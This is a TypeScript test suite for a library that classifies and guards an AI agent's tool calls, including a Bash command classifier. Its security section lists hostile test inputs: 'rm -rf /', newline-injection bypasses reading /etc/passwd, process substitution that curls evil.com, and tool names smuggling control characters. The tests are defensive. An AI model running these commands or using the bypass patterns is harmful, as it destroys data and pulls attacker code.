/**
 * Tests for ToolEnvelope, createEnvelope, ToolRegistry, BashClassifier.
 *
 * Ported from: edictum/tests/test_envelope.py
 */

import { describe, expect, test } from "vitest";

import {
  BashClassifier,
  createEnvelope,
  EdictumConfigError,
  SideEffect,
  ToolRegistry,
  _validateToolName,
} from "../src/index.js";

describe("TestCreateEnvelope", () => {
  test("deep_copy_isolation", () => {
    const original: Record<string, unknown> = {
      nested: { key: "value" },
      list: [1, 2, 3],
    };
    const envelope = createEnvelope("TestTool", original);
    (original.nested as Record<string, unknown>).key = "mutated";
    (original.list as number[]).push(4);
    expect((envelope.args.nested as Record<string, unknown>).key).toBe("value");
    expect(envelope.args.list).toEqual([1, 2, 3]);
  });

  test("metadata_deep_copy", () => {
    const meta: Record<string, unknown> = { info: { nested: true } };
    const envelope = createEnvelope("TestTool", {}, { metadata: meta });
    (meta.info as Record<string, unknown>).nested = false;
    expect(
      (envelope.metadata.info as Record<string, unknown>).nested,
    ).toBe(true);
  });

  test("frozen_immutability", () => {
    const envelope = createEnvelope("TestTool", { key: "value" });
    expect(() => {
      (envelope as Record<string, unknown>).toolName = "Modified";
    }).toThrow(TypeError);
  });

  test("factory_defaults", () => {
    const envelope = createEnvelope("TestTool", {});
    expect(envelope.toolName).toBe("TestTool");
    expect(envelope.args).toEqual({});
    expect(envelope.runId).toBe("");
    expect(envelope.callIndex).toBe(0);
    expect(envelope.sideEffect).toBe(SideEffect.IRREVERSIBLE);
    expect(envelope.idempotent).toBe(false);
    expect(envelope.environment).toBe("production");
    expect(envelope.callId).toBeTruthy(); // should be a UUID
  });

  test("run_id_and_call_index", () => {
    const envelope = createEnvelope("TestTool", {}, {
      runId: "run-1",
      callIndex: 5,
    });
    expect(envelope.runId).toBe("run-1");
    expect(envelope.callIndex).toBe(5);
  });

  test("bash_command_extraction", () => {
    const envelope = createEnvelope("Bash", { command: "ls -la /tmp" });
    expect(envelope.bashCommand).toBe("ls -la /tmp");
    expect(envelope.sideEffect).toBe(SideEffect.READ);
  });

  test("read_file_path_extraction", () => {
    const envelope = createEnvelope("Read", { file_path: "/tmp/test.txt" });
    expect(envelope.filePath).toBe("/tmp/test.txt");
  });

  test("write_file_path_extraction", () => {
    const envelope = createEnvelope("Write", { file_path: "/tmp/out.txt" });
    expect(envelope.filePath).toBe("/tmp/out.txt");
  });

  test("camel_case_file_path", () => {
    const envelope = createEnvelope("Read", { filePath: "/tmp/test.txt" });
    expect(envelope.filePath).toBe("/tmp/test.txt");
  });

  test("camel_case_write_file_path", () => {
    const envelope = createEnvelope("Edit", { filePath: "/app/.env" });
    expect(envelope.filePath).toBe("/app/.env");
  });

  test("glob_path_extraction", () => {
    const envelope = createEnvelope("Glob", { path: "/src" });
    expect(envelope.filePath).toBe("/src");
  });

  test("non_serializable_args_fallback", () => {
    /**
     * In TS, structuredClone cannot clone functions. The fallback
     * is JSON roundtrip which drops the function entirely.
     */
    const fn = () => 42;
    const envelope = createEnvelope("TestTool", {
      obj: { val: 42 },
      cb: fn,
    });
    // The regular object survives deep copy
    expect((envelope.args.obj as Record<string, unknown>).val).toBe(42);
    // The function is dropped by JSON roundtrip fallback
    expect(envelope.args.cb).toBeUndefined();
  });

  test("with_registry", () => {
    const registry = new ToolRegistry();
    registry.register("MyTool", SideEffect.READ, true);
    const envelope = createEnvelope("MyTool", {}, { registry });
    expect(envelope.sideEffect).toBe(SideEffect.READ);
    expect(envelope.idempotent).toBe(true);
  });
});

describe("TestToolRegistry", () => {
  test("unregistered_defaults_to_irreversible", () => {
    const registry = new ToolRegistry();
    const [sideEffect, idempotent] = registry.classify("Unknown", {});
    expect(sideEffect).toBe(SideEffect.IRREVERSIBLE);
    expect(idempotent).toBe(false);
  });

  test("registered_tool", () => {
    const registry = new ToolRegistry();
    registry.register("SafeTool", SideEffect.PURE, true);
    const [sideEffect, idempotent] = registry.classify("SafeTool", {});
    expect(sideEffect).toBe(SideEffect.PURE);
    expect(idempotent).toBe(true);
  });

  test("register_defaults", () => {
    const registry = new ToolRegistry();
    registry.register("WriteTool");
    const [sideEffect, idempotent] = registry.classify("WriteTool", {});
    expect(sideEffect).toBe(SideEffect.WRITE);
    expect(idempotent).toBe(false);
  });
});

describe("TestBashClassifier", () => {
  test("empty_command_is_read", () => {
    expect(BashClassifier.classify("")).toBe(SideEffect.READ);
    expect(BashClassifier.classify("   ")).toBe(SideEffect.READ);
  });

  test("allowlist_exact_match", () => {
    expect(BashClassifier.classify("ls")).toBe(SideEffect.READ);
    expect(BashClassifier.classify("pwd")).toBe(SideEffect.READ);
    expect(BashClassifier.classify("whoami")).toBe(SideEffect.READ);
  });

  test("allowlist_with_args", () => {
    expect(BashClassifier.classify("ls -la /tmp")).toBe(SideEffect.READ);
    expect(BashClassifier.classify("git status")).toBe(SideEffect.READ);
    expect(BashClassifier.classify("git log --oneline")).toBe(SideEffect.READ);
    expect(BashClassifier.classify("cat /etc/hosts")).toBe(SideEffect.READ);
  });

  test("shell_operators_force_irreversible", () => {
    expect(BashClassifier.classify("echo hello > file.txt")).toBe(
      SideEffect.IRREVERSIBLE,
    );
    expect(BashClassifier.classify("cat file.txt | grep x")).toBe(
      SideEffect.IRREVERSIBLE,
    );
    expect(BashClassifier.classify("cmd1 && cmd2")).toBe(
      SideEffect.IRREVERSIBLE,
    );
    expect(BashClassifier.classify("cmd1 || cmd2")).toBe(
      SideEffect.IRREVERSIBLE,
    );
    expect(BashClassifier.classify("cmd1 ; cmd2")).toBe(
      SideEffect.IRREVERSIBLE,
    );
    expect(BashClassifier.classify("echo $(whoami)")).toBe(
      SideEffect.IRREVERSIBLE,
    );
    expect(BashClassifier.classify("echo `whoami`")).toBe(
      SideEffect.IRREVERSIBLE,
    );
  });

  test("unknown_commands_are_irreversible", () => {
    expect(BashClassifier.classify("rm -rf /")).toBe(SideEffect.IRREVERSIBLE);
    expect(BashClassifier.classify("python script.py")).toBe(
      SideEffect.IRREVERSIBLE,
    );
    expect(BashClassifier.classify("curl https://example.com")).toBe(
      SideEffect.IRREVERSIBLE,
    );
  });

  test("env_not_in_allowlist", () => {
    expect(BashClassifier.classify("env")).toBe(SideEffect.IRREVERSIBLE);
    expect(BashClassifier.classify("printenv")).toBe(SideEffect.IRREVERSIBLE);
  });

  test("git_read_commands", () => {
    expect(BashClassifier.classify("git diff HEAD~1")).toBe(SideEffect.READ);
    expect(BashClassifier.classify("git show abc123")).toBe(SideEffect.READ);
    expect(BashClassifier.classify("git branch -a")).toBe(SideEffect.READ);
    expect(BashClassifier.classify("git remote -v")).toBe(SideEffect.READ);
    expect(BashClassifier.classify("git tag")).toBe(SideEffect.READ);
  });

  test("git_write_commands_are_irreversible", () => {
    expect(BashClassifier.classify("git push")).toBe(SideEffect.IRREVERSIBLE);
    expect(BashClassifier.classify("git commit -m 'x'")).toBe(
      SideEffect.IRREVERSIBLE,
    );
    expect(BashClassifier.classify("git checkout main")).toBe(
      SideEffect.IRREVERSIBLE,
    );
  });
});

describe("security", () => {
  describe("TestBashClassifierBypassVectors", () => {
    test("newline_injection_classified_irreversible", () => {
      expect(BashClassifier.classify("cat /etc/passwd\nrm -rf /")).toBe(
        SideEffect.IRREVERSIBLE,
      );
    });

    test("carriage_return_injection_classified_irreversible", () => {
      expect(BashClassifier.classify("cat /etc/passwd\rrm -rf /")).toBe(
        SideEffect.IRREVERSIBLE,
      );
    });

    test("process_substitution_classified_irreversible", () => {
      expect(
        BashClassifier.classify("cat <(curl http://evil.com)"),
      ).toBe(SideEffect.IRREVERSIBLE);
    });

    test("heredoc_classified_irreversible", () => {
      expect(BashClassifier.classify("cat << EOF")).toBe(
        SideEffect.IRREVERSIBLE,
      );
    });

    test("variable_expansion_classified_irreversible", () => {
      expect(BashClassifier.classify("echo ${PATH}")).toBe(
        SideEffect.IRREVERSIBLE,
      );
    });

    test("combined_bypass_attempt", () => {
      expect(
        BashClassifier.classify("cat /tmp/safe\nrm -rf / << EOF"),
      ).toBe(SideEffect.IRREVERSIBLE);
    });

    test("existing_operators_still_work", () => {
      /** Regression guard: all original operators still trigger IRREVERSIBLE. */
      expect(BashClassifier.classify("echo hello > file.txt")).toBe(
        SideEffect.IRREVERSIBLE,
      );
      expect(BashClassifier.classify("cat file.txt | grep x")).toBe(
        SideEffect.IRREVERSIBLE,
      );
      expect(BashClassifier.classify("cmd1 && cmd2")).toBe(
        SideEffect.IRREVERSIBLE,
      );
      expect(BashClassifier.classify("cmd1 || cmd2")).toBe(
        SideEffect.IRREVERSIBLE,
      );
      expect(BashClassifier.classify("cmd1 ; cmd2")).toBe(
        SideEffect.IRREVERSIBLE,
      );
      expect(BashClassifier.classify("echo $(whoami)")).toBe(
        SideEffect.IRREVERSIBLE,
      );
      expect(BashClassifier.classify("echo `whoami`")).toBe(
        SideEffect.IRREVERSIBLE,
      );
      expect(BashClassifier.classify("cat >> file.txt")).toBe(
        SideEffect.IRREVERSIBLE,
      );
      expect(BashClassifier.classify("echo #{var}")).toBe(
        SideEffect.IRREVERSIBLE,
      );
    });

    test("clean_read_commands_still_read", () => {
      /** Regression guard: clean read commands still classify as READ. */
      expect(BashClassifier.classify("cat /tmp/file")).toBe(SideEffect.READ);
      expect(BashClassifier.classify("ls -la")).toBe(SideEffect.READ);
      expect(BashClassifier.classify("grep foo bar")).toBe(SideEffect.READ);
      expect(BashClassifier.classify("git status")).toBe(SideEffect.READ);
    });
  });

  describe("TestToolNameValidation", () => {
    test("tool_name_with_null_byte_rejected", () => {
      expect(() => createEnvelope("tool\x00name", {})).toThrow(
        EdictumConfigError,
      );
      expect(() => createEnvelope("tool\x00name", {})).toThrow(
        /Invalid tool_name/,
      );
    });

    test("tool_name_with_newline_rejected", () => {
      expect(() => createEnvelope("tool\nname", {})).toThrow(
        EdictumConfigError,
      );
      expect(() => createEnvelope("tool\nname", {})).toThrow(
        /Invalid tool_name/,
      );
    });

    test("tool_name_with_path_separator_rejected", () => {
      expect(() => createEnvelope("path/to/tool", {})).toThrow(
        EdictumConfigError,
      );
      expect(() => createEnvelope("path/to/tool", {})).toThrow(
        /Invalid tool_name/,
      );
    });

    test("tool_name_with_backslash_rejected", () => {
      expect(() => createEnvelope("path\\to\\tool", {})).toThrow(
        EdictumConfigError,
      );
      expect(() => createEnvelope("path\\to\\tool", {})).toThrow(
        /Invalid tool_name/,
      );
    });

    test("tool_name_with_carriage_return_rejected", () => {
      expect(() => createEnvelope("evil\rtool", {})).toThrow(
        EdictumConfigError,
      );
      expect(() => createEnvelope("evil\rtool", {})).toThrow(
        /Invalid tool_name/,
      );
    });

    test("tool_name_with_tab_rejected", () => {
      expect(() => createEnvelope("evil\ttool", {})).toThrow(
        EdictumConfigError,
      );
      expect(() => createEnvelope("evil\ttool", {})).toThrow(
        /Invalid tool_name/,
      );
    });

    test("tool_name_with_delete_char_rejected", () => {
      expect(() => createEnvelope("evil\x7ftool", {})).toThrow(
        EdictumConfigError,
      );
      expect(() => createEnvelope("evil\x7ftool", {})).toThrow(
        /Invalid tool_name/,
      );
    });

    test("tool_name_empty_string_rejected", () => {
      expect(() => createEnvelope("", {})).toThrow(EdictumConfigError);
      expect(() => createEnvelope("", {})).toThrow(/Invalid tool_name/);
    });

    test("tool_name_normal_names_accepted", () => {
      /** Common tool name formats should all work. */
      // These should not throw
      createEnvelope("Bash", {});
      createEnvelope("file.read", {});
      createEnvelope("google-search", {});
      createEnvelope("my_tool:v2", {});
      createEnvelope("Tool123", {});
    });
  });
});

describe("TestSideEffect", () => {
  test("values", () => {
    expect(SideEffect.PURE).toBe("pure");
    expect(SideEffect.READ).toBe("read");
    expect(SideEffect.WRITE).toBe("write");
    expect(SideEffect.IRREVERSIBLE).toBe("irreversible");
  });

  test("string_behavior", () => {
    /** SideEffect constants are string literals — direct comparison works. */
    expect(SideEffect.PURE).toBe("pure");
    const val: string = "read";
    expect(val).toBe(SideEffect.READ);
  });
});
